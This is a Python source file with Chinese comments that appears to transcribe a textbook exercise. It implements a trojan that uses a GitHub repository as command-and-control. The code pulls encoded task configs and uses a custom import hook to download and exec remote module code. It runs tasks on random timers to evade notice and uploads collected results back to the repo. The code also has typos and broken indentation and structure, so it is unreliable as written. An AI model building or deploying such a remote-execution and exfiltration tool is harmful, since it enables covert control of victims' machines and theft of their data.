import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

form datetime import datetime

# 讀取在GitHub上建立的權杖(token)
def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
    user = 'tiarno'
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan')

# 接收目錄名稱、模組名稱和倉庫連接來進行處理
def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

# 建立執行基本木馬任務的Trojan類別
class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

# 1. 從repo中擷取遠端配置文件,以便讓木馬知道要執行哪些模組。
# 2. module_ruuner方法呼叫了剛才匯入模組的run函式。
# 3. 
# 4. 建立一個檔案,其檔名包含目前日期和時間,然後將其輸出結果存放到讓檔案中。
def get_config(self):
    config_json = get_file_contents(
                        'config', self.config_file, self.repo
                        )
    config = json.loads(base64.b64decode(config_json))

    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])
    return config

def module_runner(self, module):
    result = sys.modules[module].run()
    self.store_module_result(result)

def store_module_result(self, data):
    message = datetime.now().isoformat()
    remote_path = f'data/{self.id}/{message}.data'
    bindata = bytes('%r' % data, 'utf-8')
    self.repo.create_file(
                    remote_path, message, base64.b64encode(bindata)
                    )

def run(self):
    while True:
        config = self.get_config()
        for task in config:
            thread = threading.Thread(
                target=self.module_runner,
                args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 3*60*60))

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, orign=self.repo.git_url)

        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modulels[spec.name] = new_module
        return new_module

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
    